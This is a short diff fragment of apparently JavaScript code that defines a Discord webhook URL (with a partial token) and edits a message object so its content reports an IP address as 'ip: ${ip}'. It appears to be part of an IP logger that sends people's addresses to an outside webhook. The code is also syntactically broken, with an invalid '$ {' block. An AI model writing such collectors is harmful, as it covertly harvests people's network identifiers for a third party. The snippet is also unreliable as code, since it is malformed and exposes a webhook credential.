@@ -2,7 +2,7 @@ const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1
 
 const msg = {
     "content": $ {
-        IP
+        "ip: ${ip}"
     }
 }
 
